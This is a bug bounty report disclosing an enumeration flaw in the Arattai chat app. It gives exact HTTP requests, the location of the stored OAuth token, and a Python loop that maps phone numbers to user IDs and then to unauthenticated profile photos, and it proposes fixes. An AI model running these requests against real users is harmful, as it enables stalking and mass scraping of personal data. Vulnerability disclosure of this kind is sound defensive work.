# Bug Bounty Report: Phone Number → User Identity Enumeration Chain

## Title
Unauthenticated Profile Photo Access + Phone Number to User ID Enumeration Without Rate Limiting Enables Mass User Deanonymization

## Severity
**HIGH** (CVSS 3.1: 7.5 for Bug 2 standalone — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**HIGH** (CVSS 3.1: 6.5 for Bug 1 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

Note: The chained impact (mass deanonymization at scale with no throttling) justifies Critical review given privacy implications.

## Affected Component
- Arattai Android App v1.54.0 (com.aratai.chat)
- API: `https://chat.arattai.in/v3/directory`
- API: `https://profile.arattai.in/file`

## Summary
The `/v3/directory` API endpoint allows any authenticated Arattai user to look up arbitrary phone numbers and determine:
1. Whether the phone number is registered on Arattai
2. The user's internal user ID (Zoho UID)

This endpoint has **zero rate limiting**, allowing enumeration at ~14 requests/second (~1.2 million phone numbers per day). The leaked user ID can then be used to access the user's profile photo via `https://profile.arattai.in/file?ID={user_id}&fs=thumb` **without any authentication**.

## Steps to Reproduce

### Step 1: Extract OAuth Token
The OAuth access token is stored in the SQLite database at:
```
/data/data/com.aratai.chat/databases/iamoauthNativelib.db
Table: IAMOAuthTokens (type='AT')
```

### Step 2: Phone Number → User ID
```http
GET /v3/directory?phone_number=916390090194 HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted_oauth_token>
X-Reader-Version: 1
User-Agent: ArattaiAndroid/1.54.0
```

**Response (registered user):**
```json
{"user_id":"20034686476","status":"active"}
```

**Response (unregistered):**
```json
{"status":"not_found"}
```

### Step 3: User ID → Profile Photo (NO AUTH REQUIRED)
```http
GET /file?ID=20034686476&fs=thumb HTTP/1.1
Host: profile.arattai.in
```
Returns the user's profile photo as `image/png` with **no authentication header needed**.

### Step 4: Mass Enumeration (No Rate Limiting)
```python
# Proof of concept - 20 requests in 1.4 seconds, all succeed
import requests

token = "Zoho-oauthtoken 1001.xxx.xxx"
headers = {"Authorization": token, "X-Reader-Version": "1"}

for i in range(20):
    r = requests.get(
        f"https://chat.arattai.in/v3/directory?phone_number=91999999{i:04d}",
        headers=headers
    )
    print(r.json())
# All 20 succeed - zero rate limiting
```

## Impact

### Privacy Impact
- **Mass user enumeration**: Any authenticated user can determine whether any phone number in the world is registered on Arattai
- **Profile photo scraping**: Using leaked user IDs, profile photos of all users can be accessed without authentication
- **Identity correlation**: Phone number + profile photo = real-world identity
- **Scale**: At 14 req/sec, an attacker can scan all Indian mobile numbers (~1 billion) in under 30 days

### Attack Scenarios
1. **Surveillance**: A stalker enters a target's phone number → confirms they use Arattai → sees their profile photo
2. **Social engineering**: Attacker correlates phone numbers with photos for phishing campaigns
3. **Data harvesting**: Scraping all user IDs and profile photos for a database of Arattai users
4. **Phone number privacy**: Users expect their phone number registration to be private; this endpoint exposes it to any other user

### Additional Data Exposure
The `GET /v3/users/me` endpoint reveals the API returns extensive PII fields including: `phone`, `user_name`, `verified`, `about`, `business_profile`, `country`, `language`, `timezone`, `verification_info`. If the `GET /v3/users/{userId}` endpoint (which uses the same response model `UserResponse.Data`) can be made to work with other users' IDs, it would expose their phone number, name, verification status, and more.

## Root Cause
1. The `/v3/directory` endpoint has no rate limiting, CAPTCHA, or abuse prevention
2. The `profile.arattai.in/file` endpoint does not require authentication
3. User IDs are sequential integers, making enumeration trivial

## Remediation
1. **Rate limit** the `/v3/directory` endpoint (e.g., 5 requests per minute per user)
2. **Require authentication** for `profile.arattai.in/file` access
3. **Use non-sequential, non-guessable identifiers** (UUIDs) instead of sequential integers
4. Consider requiring **mutual contact consent** before revealing user presence (like Signal's approach)
5. Add **anomaly detection** for bulk phone number lookups

## Environment
- App: Arattai v1.54.0 (com.aratai.chat)
- Android: API 35 (emulator, x86_64)
- Proxy: Burp Suite Pro v2026.7.2
- Frida: 17.17.0
- Date: 2026-10-05
